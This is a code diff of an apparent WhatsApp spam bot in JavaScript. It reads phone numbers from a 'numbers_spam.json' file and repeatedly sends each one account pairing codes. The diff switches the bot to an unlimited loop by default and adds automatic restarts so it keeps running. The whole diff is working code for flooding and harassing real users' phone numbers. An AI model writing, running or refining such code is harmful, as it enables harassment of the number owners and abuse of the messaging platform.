@@ -21,8 +21,6 @@ const checkFileChange = (filePath) => {
     return false;
 };
 
-const MAX_CONCURRENT_REQUESTS = 5000; // عدد الطلبات المتزامنة لكل رقم
-
 async function XeonProject() {
     const { state } = await useMultiFileAuthState('./session');
     const XeonBotInc = makeWASocket({
@@ -50,29 +48,50 @@ async function XeonProject() {
     loadNumbers();
 
     const option = await Promise.race([
-        question('Choose an option:\n1. 1000\n2. Unlimited\nEnter your choice (1 or 2): '),
+        question(''),
         new Promise((resolve) => setTimeout(() => resolve('2'), 1000))
     ]);
 
-    // إعداد المهام لكل رقم
-    const tasks = phoneNumbers.map(phoneNumber => {
-        return async () => {
-            let count = 0;
-            if (option === '1') {
-                const xeonCodes = 1000;
-                for (let i = 0; i < xeonCodes; i++) {
+    let count = 0;
+
+    const intervalId = setInterval(() => {
+        loadNumbers();
+        if (checkFileChange('numbers_spam.json')) {
+            console.log("File changed, restarting...");
+            spawn(process.execPath, [__filename], { stdio: 'inherit' });
+            process.exit();
+        }
+    }, 1000);
+
+    setInterval(() => {
+        console.log("Pausing for 10 minutes...");
+        clearInterval(intervalId);
+
+        setTimeout(() => {
+            console.log("Restarting the process...");
+            spawn(process.execPath, [__filename], { stdio: 'inherit' });
+            process.exit();
+        }, 10000);
+    }, 10 * 60 * 1000);
+
+    try {
+        if (option === '1') {
+            const xeonCodes = 1000;
+            for (let i = 0; i < xeonCodes; i++) {
+                for (const phoneNumber of phoneNumbers) {
                     await sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes);
                 }
-            } else {
-                while (true) {
+            }
+        } else {
+            while (true) {
+                for (const phoneNumber of phoneNumbers) {
                     await sendPairingCode(XeonBotInc, phoneNumber, ++count);
                 }
             }
-        };
-    });
-
-    // تنفيذ المهام بشكل متزامن
-    await Promise.all(tasks.map(task => task()));
+        }
+    } catch (error) {
+        console.error('error:', error);
+    }
 
     return XeonBotInc;
 }
